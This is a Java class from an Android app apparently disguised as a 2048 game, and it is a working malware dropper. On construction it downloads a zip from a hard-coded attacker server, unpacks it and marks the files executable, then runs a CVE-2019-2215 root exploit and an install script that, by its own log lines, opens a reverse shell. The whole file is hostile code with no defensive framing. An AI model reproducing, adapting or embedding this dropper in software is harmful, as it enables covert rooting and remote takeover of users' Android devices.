package aarkay.a2048game;

import android.content.Context;
import android.util.Log;

import org.jetbrains.annotations.NotNull;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;

public class Temproot {
    public Temproot(@NotNull Context context) throws IOException {
        // Modify URL IP and Port according to Attacker dropper server and port
        String URL = "http://192.168.157.73:8080/process_command";
        String filenames[] = {"shells.zip", "cve-2019-2215", "install.sh"};

        String filePath = "/data/data/aarkay.a2048game/files"; // /data/data/<package>/files
        String localPath = filePath + "/" + filenames[0];
        Log.d("Temproot", "LOCAL PATH: " + localPath);

        String cmd_chmod = "/system/bin/chmod 755 " + localPath;
        String cmd_unzip = "/system/bin/unzip " + filePath + "/" + filenames[0] + " -d " + filePath + "/";
        String cmd_execcve = "." + filePath + "/" + filenames[1];
        String cmd[] = { cmd_chmod,  cmd_unzip, cmd_execcve };

        // Check if filePath exist
        File file_d = new File(filePath);
        deleteFolder(file_d); // Delete the folder recursively
        boolean createDir = file_d.mkdirs(); // Make the folder again

        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                download(URL, localPath);

                Runtime rt = Runtime.getRuntime();

                try {
                    Log.d("Temproot", "Executing chmod 755 on shells.zip...");
                    rt.exec(cmd[0]);
                    Log.d("Temproot", "Execution chmod complete...");

                    Log.d("Temproot", "Executing unzip...");
                    rt.exec(cmd[1]).waitFor();
                    Log.d("Temproot", "Execution unzip complete...");

                    Log.d("Temproot", "Executing chmod 755 on unzipped files...");
                    for (int i = 1; i < filenames.length; i++){
                        rt.exec("/system/bin/chmod 755 " + filePath + "/" + filenames[i]).waitFor();
                    }
                    Log.d("Temproot", "Execution chmod complete...");
//
                    Log.d("Temproot", "CVE-2019-2215 + Reverse Shell...");
                    rt.exec(cmd[2]).waitFor();
                    Log.d("Temproot", "CVE && Reverse shell complete");

                } catch (IOException e) {
                    e.printStackTrace();
                } //catch (InterruptedException e) {
                catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        });
        thread.start();
    }

    private void download(String urlStr, String localPath) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection urlConn = (HttpURLConnection) url.openConnection();
            urlConn.setRequestMethod("GET");
            urlConn.setInstanceFollowRedirects(true);
            urlConn.connect();
            InputStream is = urlConn.getInputStream();
            FileOutputStream out = new FileOutputStream(localPath);
            int read;
            byte[] buffer = new byte[4096];
            while ((read = is.read(buffer)) > 0) {
                out.write(buffer, 0, read);
            }
            out.close();
            is.close();
            urlConn.disconnect();
        } catch (MalformedURLException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    private void deleteFolder(File folder){
        File[] files = folder.listFiles();
        if (files != null) {
            for (File f : files){
                if (f.isDirectory()){
                    deleteFolder(f);
                }
                else {
                    f.delete();
                }
            }
        }
        folder.delete();
    }
}
